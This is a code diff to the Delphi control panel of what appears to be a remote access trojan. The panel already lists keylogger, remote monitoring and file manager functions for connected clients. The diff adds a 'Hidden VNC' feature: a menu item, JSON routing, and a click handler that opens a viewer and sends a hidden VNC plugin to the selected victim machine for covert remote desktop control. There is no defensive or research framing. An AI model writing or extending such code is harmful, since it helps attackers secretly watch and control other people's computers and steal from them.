@@ -46,6 +46,7 @@ type
     RemoteMonitoring1: TMenuItem;
     Keylogger1       : TMenuItem;
     OpenURL1: TMenuItem;
+    HiddenVNC1: TMenuItem;
     TabSheet1: TTabSheet;
     FileManager1: TMenuItem;
 
@@ -62,6 +63,7 @@ type
     procedure Keylogger1Click(Sender: TObject);
     procedure OpenURL1Click(Sender: TObject);
     procedure FileManager1Click(Sender: TObject);
+    procedure HiddenVNC1Click(Sender: TObject);
   private
     FServerManager: TServerManager;
     FCurrentPort  : Integer;
@@ -75,10 +77,12 @@ type
     procedure OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnFileManagerReceived(aLine: TncLine; JSONObj: TJSONObject);
+    procedure OnHiddenVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
     procedure OnServerLog(Category: TLogCategory; const Msg: string);
     procedure AddLog(Category: TLogCategory; const Msg: string);
     procedure EnsureRemoteMonitoringMenuItem;
     procedure EnsureKeyloggerMenuItem;
+    procedure EnsureHiddenVNCMenuItem;
     function  IsRealClientValue(const Value: string): Boolean;
     function  PreferClientValue(const NewValue, CurrentValue: string): string;
     procedure AddOrUpdateListView(const Info: TClientInfo);
@@ -113,6 +117,7 @@ begin
   FServerManager.OnMonitoringReceived  := OnMonitoringReceived;
   FServerManager.OnKeyloggerReceived   := OnKeyloggerReceived;
   FServerManager.OnFileManagerReceived := OnFileManagerReceived;
+  FServerManager.OnHiddenVNCReceived   := OnHiddenVNCReceived;
   FServerManager.OnLog                 := OnServerLog;
 
   if Assigned(ProcessManager1) then
@@ -125,6 +130,7 @@ begin
   EnsureRemoteMonitoringMenuItem;
   EnsureKeyloggerMenuItem;
   EnsureOpenURLMenuItem;
+  EnsureHiddenVNCMenuItem;
   if Assigned(FileManager1) then
     FileManager1.OnClick := FileManager1Click;
   ListView1.OnMouseDown := ListView1MouseDown;
@@ -315,6 +321,21 @@ begin
   end;
 
   OpenURL1.OnClick := OpenURL1Click;
+end;
+
+procedure TForm1.EnsureHiddenVNCMenuItem;
+begin
+  if not Assigned(PopupMenu1) then
+    Exit;
+
+  if not Assigned(HiddenVNC1) then
+  begin
+    HiddenVNC1         := TMenuItem.Create(PopupMenu1);
+    HiddenVNC1.Caption := 'Hidden VNC';
+    PopupMenu1.Items.Add(HiddenVNC1);
+  end;
+
+  HiddenVNC1.OnClick := HiddenVNC1Click;
 end;
 
 // ---- Server Initialization ----
@@ -525,6 +546,7 @@ begin
   FServerManager.UnregisterKeyloggerForm(aLine);
   FServerManager.UnregisterOpenURLForm(aLine);
   FServerManager.UnregisterFileManagerForm(aLine);
+  FServerManager.UnregisterHiddenVNCForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
@@ -585,6 +607,16 @@ begin
   F9 := FServerManager.GetFileManagerForm(aLine);
   if Assigned(F9) then
     F9.HandleFileManagerJSON(JSONObj);
+end;
+
+procedure TForm1.OnHiddenVNCReceived(aLine: TncLine; JSONObj: TJSONObject);
+var
+  F10: TForm10;
+begin
+  if not Assigned(FServerManager) then Exit;
+  F10 := FServerManager.GetHiddenVNCForm(aLine);
+  if Assigned(F10) then
+    F10.HandleHiddenVNCJSON(JSONObj);
 end;
 
 { --- UI Yardimci Metodlar --- }
@@ -802,6 +834,51 @@ procedure TForm1.UpdateStatusBar;
 begin
   StatusBar3.Panels[0].Text :=
     'Clients Online [' + IntToStr(FServerManager.ClientCount) + ']';
+end;
+
+procedure TForm1.HiddenVNC1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F10         : TForm10;
+  ClientID    : string;
+begin
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Please select a client first.', 'Hidden VNC',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then
+  begin
+    MessageBox(Handle, 'Selected client information not found.', 'Hidden VNC',
+               MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  F10 := FServerManager.GetHiddenVNCForm(SelectedLine);
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  if not Assigned(F10) then
+  begin
+    F10 := TForm10.Create(Application);
+    FServerManager.RegisterHiddenVNCForm(SelectedLine, F10);
+  end;
+
+  F10.SetupForClient(SelectedLine, ClientID,
+                    FServerManager.SendJSON,
+                    FServerManager.UnregisterHiddenVNCForm);
+  F10.Show;
+  F10.BringToFront;
+
+  FServerManager.SendHiddenVNCPlugin(SelectedLine);
 end;
 
 end.
